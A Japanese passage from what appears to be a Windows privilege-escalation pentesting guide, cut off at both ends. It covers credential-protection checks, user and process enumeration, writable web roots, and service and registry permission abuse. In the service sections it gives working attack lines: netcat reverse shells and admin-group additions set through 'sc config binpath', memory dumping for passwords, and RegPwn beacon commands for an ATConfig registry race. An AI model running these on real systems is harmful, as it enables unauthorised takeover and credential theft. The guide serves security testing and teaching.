Windows Event Forwardingでは、ログがどこに送信されるかを把握しておくことが重要です。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** は、ドメインに参加しているコンピューターの**ローカル Administrator パスワードを管理**するために設計されており、各パスワードが**一意で、ランダムに生成され、定期的に更新される**ようにします。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、認可されたユーザーはローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認できます**](../stealing-credentials/credentials-protections.md#wdigest)。

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1**から、MicrosoftはLocal Security Authority（LSA）に対する強化された保護機能を導入し、信頼されていないプロセスによる**メモリの読み取り**やコードの挿入を**ブロック**して、システムのセキュリティをさらに強化しました。\
[**LSA Protectionの詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威からデバイスに保存された認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって使用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報についての詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属するグループに興味深い権限がないか確認してください。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格できる可能性があります**。特権グループについて、また権限昇格のためにそれらを悪用する方法については、こちらをご覧ください。


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**について**詳しく学べます**：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
次のページでは、**興味深いtoken**と、それらを悪用する方法について学べます。


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン中のユーザー / セッションಗಳು

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーの権限

まず、プロセスを一覧表示したら、**プロセスのコマンドラインにパスワードが含まれていないか確認します**。\
**実行中のバイナリを上書きできるか、またはバイナリのフォルダーへの書き込み権限があるかを確認し、** [**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用できないか調べます。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に実行中の[**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)がないか確認してください。これを悪用して権限昇格できる可能性があります。

debugger listenerは短時間しか起動しないことがあるため、受動的なポートスナップショットで確認できなかったとしても、過去に公開されていなかった証拠にはなりません。観測したlistenerについて、PID、プロセス所有者、低権限ユーザーが到達できるかを照合してください。アプリケーション名やdebugフラグだけでは、ユーザーをまたいだコード実行が可能だとは判断できません。日常的な列挙は受動的に行い、debuggerコマンドは送信しないでください。

**プロセスのバイナリの権限を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリが置かれたフォルダーのアクセス権を確認する（**[**DLL Hijacking**](dll-hijacking/index.html)**）**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor ディレクトリ

Snort 2 は、`snort.exe -c <config>` で選択した設定ファイルで宣言されている `dynamicpreprocessor directory` から共有ライブラリをロードできます。別のアカウントで Snort を実行する scheduled task または service がある場合は、その task または service が使う設定ファイルと、宣言されたモジュールディレクトリの ACL を確認してください。自分の token でそのディレクトリにファイルを作成できる場合、その task または service が次にモジュールをロードするときの code execution の可能性を検討する対象になります。run-as アカウントの実効権限、使用中の設定、モジュールの互換性、deny または共有に関する制限を確認してください。ディレクトリが writable であるだけでは、privilege escalation が成立するとは限りません。[Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) では、runtime でのモジュールロードについて説明しています。

### writable な document root を持つ privileged web service

Windows の Apache インストールでは、service の実行ファイルのパスと run-as アカウントを、使用中の `httpd.conf` にある `DocumentRoot` と照合してください。一般的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、設定されている document root（多くの場合は `C:\xampp\htdocs`）の ACL を確認します。Apache が `LocalSystem` として実行されている間に、低い権限のユーザーがその root にファイルを作成できる場合、server-side code execution によってホストの権限境界を越えられる可能性があります。service が実行中であること、正確なパスが配信されていること、対象のファイル形式が server-side handler によって処理されることを確認してください。root が writable であるだけでは、ファイルを作成できることしか証明できません。書き込みテストは行わずに ACL を確認してください:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

従来型の WAMP インストールでは、サービスがバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit のレイアウトでは `C:\wamp\...`）を指定し、その隣の `conf\httpd.conf` に設定ファイルがあり、デフォルトのルートが `C:\wamp64\www` または `C:\wamp\www` になっていることがあります。正確なサービスイメージ、その実行ユーザー、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開や仮想ホストによる上書きを含む）、ルートの ACL をまとめて確認してください。WAMP ディレクトリが書き込み可能だからといって、Apache が `SYSTEM` として実行されている、あるいは投入したファイルが実行されるとは限りません。[Apache は、Windows サービスが設定ファイルをどのように選択するかを説明しています](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートとアプリケーションプールのネットワーク ID

IIS では、`applicationHost.config` で書き込み可能な物理ディレクトリが**有効なサイト／アプリケーション**に割り当てられていることを確認し、設定されたプールとサーバー側のハンドラーを特定します。配信対象のディレクトリに置かれたコードがプールの ID で実行されるのは、IIS がそのファイル形式を処理し、ルートに到達できる場合に限られます。書き込み可能なディレクトリをコード実行とみなす前に、現在のユーザーが実際にファイルを作成できるか、サイトが稼働中か、ハンドラーやパスごとの上書き設定がどうなっているかを確認してください。

ASP.NET の動的コンパイルには、別途確認すべき経路があります。アプリケーションのコンパイルディレクトリに生成されるファイルです。デフォルトでは、該当する .NET Framework のインストール先の下にある `Temporary ASP.NET Files` ディレクトリですが、アプリケーションの `<compilation tempDirectory>` で変更できます。[Microsoft は保存先とアプリケーションごとのサブディレクトリについて説明しており](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)、[アプリケーションプール同士が互いを信頼しない場合は、コンパイルディレクトリを分離することを推奨しています](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低い権限のトークンで**特定の**アプリケーションのキャッシュ内にある生成ソースを変更できる場合、そのアプリケーションがそれをより高い権限の[ワーカープロセス ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)で再コンパイルするか確認してください。ファイルやディレクトリの ACL だけではコード実行の証明にはなりません。キャッシュを有効なアプリケーション、実効トークンと ACL、コンパイル設定、プロセス ID、再コンパイルのタイミングと照合してください。読み取り専用でメタデータを確認し、列挙中にコンパイルを誘発したりキャッシュファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` に設定された IIS プールは、ローカルのトークンが低権限であっても、ドメインリソースに対して一般に**ホストコンピューターアカウント**として認証します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上でもコンピューターアカウントを使用します。一方、`LocalService` は通常、匿名のネットワーク資格情報を提示します。`SpecificUser` プールは、設定されたアカウントを使用します。[Microsoft はこれらの ID の種類](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)と[アプリケーションプールのネットワーク ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)について説明しています。ID の設定が省略されている場合はプールのデフォルトを継承することがありますが、デフォルトは IIS の世代によって異なるため、プール名から推測せず実効設定を確認してください。コード実行がコンピューターアカウントのネットワーク ID を持つプールに到達する場合は、**そのコンピューター固有の**ディレクトリ権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md) にはドメインの命名コンテキストに対するレプリケーション権限が必要です。マシンアカウントのチケットやホストの役割だけでは、その権限があるとは証明できません。パッシブな列挙では、ファイルのアップロード、ネットワーク認証、チケット要求を行わずに設定と ACL を確認してください。

ヘルパープロセスを起動する読み取り可能な ASP.NET ハンドラーについては、リクエスト由来の値が、認証、復号、検証、コマンド構築を経る経路を追跡してください。デコードしたトークンを `ProcessStartInfo("cmd", "/c ...")` に連結するハンドラーでは、シェルのメタ文字によってコマンドが変わる可能性があります。[Microsoft は `cmd` の特殊文字について説明しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼されていない呼び出し元が実際にデコード後の値を制御でき、ハンドラーに到達できることを確認したうえで、実効アプリケーションプール ID または偽装 ID と、子プロセスの ID を特定してください。ソースコードの一行、localhost のリスナー、トークン形式の弱点だけでは、特権コマンド実行の証明にはなりません。パッシブな列挙中は、偽造リクエストの送信やヘルパーの実行をせずに、ソースコードとプール設定を確認してください。

Windows 上の PHP サービスでは、リクエストで制御されるパスが[`include` または `require`](https://www.php.net/manual/en/function.include.php)に渡されると、ワーカープロセスの ID で、低権限ユーザーが書き込み可能な PHP ファイルが評価される可能性があります。リクエストがその処理に到達できること、解決されたパスが低権限ユーザーには変更可能でワーカーには読み取り可能なファイルを指すこと、適用される PHP のパス制限が include を許可していること、そしてワーカーが実際により高い権限で実行されていることを確認してください。ループバックリスナーや書き込み可能なファイルだけでは、この一連の条件が成立するとは限りません。パッシブな列挙中は、エンドポイントを呼び出さずにソースコード、サービス ID、ファイル ACL を確認してください。

### メモリからのパスワード抽出

sysinternals の **procdump** を使うと、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスは**認証情報をメモリ内に平文で保持している**ことがあるため、メモリをダンプして認証情報を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でない GUI アプリ

**SYSTEM として実行されるアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows Help and Support」（Windows + F1）で「command prompt」を検索し、「Click to open Command Prompt」をクリックする

### 特権アカウントでのプロジェクトファイルのインポート

低権限ユーザーが書き込み可能なドロップディレクトリからプロジェクトを自動的に開くアプリケーションは、インポーターのアカウント下で入力の信頼境界を越えます。**実際の書き込み可能なパス**、そのパスを開くプロセスまたはタスク、実効 ID、パーサーのビルドを確認してください。[過去の Ghidra プロジェクトのオープン／復元に関する問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトのメタデータで XML 外部エンティティが許可されていました。Windows では、[送信 SMB および NTLM のポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)が許可していれば、ネットワークエンティティによってインポートアカウントから認証が行われる可能性があります。これは認証情報漏えいの手掛かりであり、直ちに管理者アクセスが得られるわけではありません。応答を利用するには、別の認可済みまたは脆弱な経路が必要です。また、現行ビルドについては、実際のパッチ適用状況を確認してください。受動的な列挙中に細工したプロジェクトを開かず、インポートのワークフローと ACL を調査してください。

## Services

Service Control Manager（SCM）オブジェクトの[`SC_MANAGER_CREATE_SERVICE` 権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存のサービスに対する権限とは別です。この権限を指定した読み取り専用の[`OpenSCManager` アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、確認すべき手掛かりにすぎず、新しいサービスを実行できる証明にはなりません。[`CreateService` はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。このハンドルには作成時に要求したサービスアクセス権が付与されます。後からサービスを再度開く際は別途アクセスチェックが行われるため、元のハンドルを使用できても再オープンには失敗する場合があります。実効ローカルまたはリモートトークン、ハンドルに付与された権限、サービスアカウント、開始ポリシー、実行ファイルのパスをそれぞれ確認してください。受動的な列挙中にサービスを作成または開始しないでください。

リモートでサービスをインストールする経路を調べる際は、SCM の権限に加えて、対象上で**同じネットワークログオン**が書き込み可能な共有、その共有の基盤となる NTFS ACL、サービスアカウントが実行できるローカルの実行ファイルパスを関連付けて確認してください。SCM の権限が異例に広く、ファイル配置の経路も存在する場合、非管理者アカウントでもこの境界を越えられる可能性があります。管理共有は必須ではありません。共有への書き込み権限だけでも、SCM のサービス作成に関する手掛かりだけでも、新しいサービスがより高い権限で開始できるとは言えません。

既存のサービスは、ヘルパーが `ImagePath` に指定されていなくても、起動時、シャットダウン時、または別のライフサイクルイベント時にヘルパー実行ファイルを呼び出すことがあります。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリから解決され、サービスがより高い権限で実行される場合、欠落しているヘルパーファイルは条件付きで置き換え候補になります。**実際のサービスコードまたは文書化されたヘルパー呼び出し**、解決される実行ファイルのパスと検索順序、ディレクトリの作成権限、サービス ID、利用可能なライフサイクルトリガーを確認してください。サービスディレクトリが書き込み可能であることや、ファイルが存在しないことだけでは、サービスがそのファイルを読み込むとは言えません。受動的な調査ではサービスを開始または停止しないでください。

既存のサービスでは、[`SERVICE_START` によって `StartService` に引数を渡せます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは[`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは別の権限です。開始権限を単なる制御権以上のものとして扱う前に、サービスのコードまたは文書化されたインターフェイスを確認してください。呼び出し元が選択した引数をログまたはエクスポート先のパスとして使用する場合は、サービス ID、引数から書き込みに至る実際の処理、パスの制限、**作成されるファイル**の権限を確認してください。保護されたディレクトリへの書き込みが権限昇格につながるのは、そのファイルを受け入れる別の特権コンシューマーまたはローダーが存在する場合に限られます。書き込み可能なログや開始権限だけでは不十分です。受動的なインベントリではサービスを開始したり、テストファイルを作成したりしないでください。

NSClient++ monitoring agent について、読み取り可能な `nsclient.ini` は**設定確認の手掛かり**です。Web の認証情報が含まれている場合があり、`boot.ini` によって設定ファイルの場所が別の場所にリダイレクトされることもあります。実際のサービスアカウント、WEB リスナーとアクセス ポリシー、認証済みロールで設定やスクリプトを変更できるかを確認してください。特権実行には、さらに `CheckExternalScripts`（または有効になっている別の実行経路）、コマンドの登録または変更を行う実効権限、それをサービス ID で実行するトリガーが必要です。ループバック限定のリスナーでもローカルユーザーがアクセスできる場合がありますが、ファイルパス、パスワード、リスナーだけでは、そうした権限があるとは言えません。受動的な列挙中は、メタデータと権限を確認するにとどめ、シークレットを表示したり Web API を呼び出したりしないでください。[NSClient++ のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Web およびスクリプトのセキュリティガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath` が `nssm.exe` のサービスについては、サービスの実際の実行アカウントと、`HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` の値を確認してください。[NSSM は子アプリケーションをここに保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。一方、`AppDirectory` は設定された作業ディレクトリです。ラッパーの権限だけでサービス境界全体を判断する前に、子実行ファイルとその親ディレクトリの ACL を確認してください。その子が公開するローカル WCF または SOAP エンドポイントは、別途確認すべき手掛かりです。低権限ユーザーからリスナーに到達できること、該当する操作がユーザーの入力を受け付けること、サービスの子プロセスがより高い権限で危険な操作を実行することを確認してください。サービスアカウント、エンドポイント URL、書き込み可能なパスだけでは、権限昇格の証明になりません。受動的な列挙中にサービス操作を呼び出さないでください。

カスタム WCF 操作では、呼び出し元が制御する文字列が PowerShell runspace に渡されるかを追跡してください。[`Pipeline.Commands.AddScript` はスクリプトテキストを追加し](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)、[`Pipeline.Invoke` はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windows transport credentials を使用する `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、その**特定の**操作を呼び出す権限と runspace の実効 ID は別途確認する必要があります。低権限の呼び出し元の入力が、より高いサービス ID で実行される `AddScript` に渡る経路は、コード実行の境界です。リスニングポート、認証済みクライアント、無関係なアセンブリ内の未使用メソッドだけでは証明になりません。列挙中にエンドポイントを呼び出さず、デプロイ済みサービス、コントラクト、認可、偽装設定を静的に調査してください。

Service Triggers を使うと、特定の条件（名前付きパイプ／RPC エンドポイントのアクティビティ、ETW イベント、IP の利用可能状態、デバイスの接続、GPO の更新など）が発生したときに Windows がサービスを開始できます。SERVICE_START 権限がなくても、トリガーを発生させて特権サービスを開始できる場合があります。列挙および有効化の手法については、こちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ tooling を含む Visual Studio のインストールには、`LocalSystem` として実行するよう設定された診断サービス `VSStandardCollectorService150` が含まれる場合があります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、junction と object-manager-link の競合状態を利用してサービスの DACL リセット先をリダイレクトしました。実証された権限昇格には、使用可能な Visual Studio Setup WMI Provider MSI 修復経路と、その `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` ターゲットも必要でした。このコンポーネントは 2024 年 1 月に修正されています。

受動的なトリアージでは、このサービスのアカウントとバイナリパスを確認し、Setup WMI compiler のパスが存在するか、インストール済みコンポーネントにパッチが適用されているかを確認してください。サービスエントリ、Visual Studio の製品バージョン、コンパイラファイルだけでは、ホストが脆弱であるとは言えません。調査のためにサービスを開始したり、修復を実行したりする必要はありません。

サービスの一覧を取得します：

```bash
net start
wmic service list brief
sc query
Get-Service
```

### 権限

サービスの情報を取得するには **sc** を使用できます。

```bash
sc qc <service_name>
```

各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意することを推奨します。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」がサービスを変更できるかどうか確認することをお勧めします:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

（たとえば SSDPSRV で）次のエラーが発生する場合：

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、有効なデバイスが関連付けられていないため、開始できません。_

次のコマンドで有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**サービス upnphost が動作するには SSDPSRV に依存している点に注意してください（XP SP1 の場合）**

**この問題の別の回避策**は、次を実行することです。

```
sc.exe config usosvc start= auto
```

### **サービスのバイナリパスを変更する**

「Authenticated users」グループがサービスに対して **SERVICE_ALL_ACCESS** を持つ場合、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには、次のようにします。

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスを再起動する

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限昇格は、さまざまな権限を通じて可能です。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再構成を許可します。
- **WRITE_DAC**: 権限の再構成を可能にし、サービス設定を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再構成を許可します。
- **GENERIC_WRITE**: サービス設定を変更する権限を継承します。
- **GENERIC_ALL**: サービス設定を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱な権限

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つドメインアカウントとして実行されていて、**低権限ユーザーがサービスの EXE またはその親フォルダーを変更できる**場合、**バイナリを置き換えてサービスを再起動する**ことで、多くの場合サービスを乗っ取れます。

**サービスが実行するバイナリを変更できるか**、またはバイナリが格納されている**フォルダーへの書き込み権限があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**.**）\
**wmic**（system32 内にはありません）を使用してサービスが実行するすべてのバイナリを取得し、**icacls** で権限を確認できます。

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

**sc** と **icacls** も使用できます。

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービスの実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実践的な悪用手順は次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスのバイナリを payload または有効な悪意のあるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動／サービスのトリガーを待ちます）。

便利な自動チェック：<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスで通常ユーザーによる再起動が許可されていない場合は、起動時に自動で開始されるか、障害発生時に再起動するアクションが設定されているか、またはそのサービスを使用するアプリケーションから間接的に起動できるかを確認してください。

### サービスのレジストリ変更権限

サービスのレジストリを変更できるか確認してください。\
サービスの**レジストリ**に対する**権限**は、次のように**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

元の権限チェックは次のように記述されていました。

**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認します。持っている場合、サービスによって実行されるバイナリを変更できます。

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持っているか確認してください。ACL エントリがあるだけでは、実効アクセスが可能とは限りません。拒否エントリ、現在のトークン、継承された権限も考慮する必要があります。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` 権限および `SERVICE_START` 権限とは別のものです。権限昇格には、利用可能なサービス構成フィールド、サービスを起動する方法、さらに高い権限を持つサービスIDも必要です。Microsoft の[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)と[サービスのアクセス権に関するリファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリの Path を変更するには:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### 任意の HKLM value write を実現する Registry symlink race（ATConfig）

一部の Windows アクセシビリティ機能は、ユーザーごとの **ATConfig** キーを作成します。その後、**SYSTEM** プロセスがこれを HKLM のセッションキーにコピーします。Registry **symbolic link race** により、この特権的な書き込み先を **任意の HKLM path** にリダイレクトでき、任意の HKLM **value write** プリミティブを得られます。<sup>[[18]](#references)</sup>

主な場所（例：スクリーン キーボード `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みのアクセシビリティ機能が列挙されています。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` はログオン時やセキュア デスクトップへの切り替え時に作成され、ユーザーが書き込み可能です。

悪用の流れ（CVE-2026-24291 / ATConfig）:

1. SYSTEM に書き込ませたい値を **HKCU ATConfig** に設定します。
2. セキュア デスクトップへのコピーをトリガーします（例：**LockWorkstation**）。これにより AT broker の処理が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ちます**。oplock が発動したら、**HKLM Session ATConfig** キーを、保護された HKLM の対象を指す **registry link** に置き換えます。
4. SYSTEM が、攻撃者の選んだ値をリダイレクト先の HKLM path に書き込みます。

任意の HKLM value write ができたら、サービスの設定値を上書きして LPE に移行します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/コマンドライン）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが起動できるサービス（例：**`msiserver`**）を選び、書き込み後に起動します。**注:** 公開されている exploit の実装では、race の一環としてワークステーションをロックします。

ツールの例（RegPwn BOF / standalone）:<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限がある場合、**そのレジストリの下にサブレジストリを作成できます**。Windows サービスの場合、これだけで**任意のコードを実行するのに十分です**。


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windows はスペースまでの各部分を実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次のファイルを実行しようとします。

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて列挙します:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
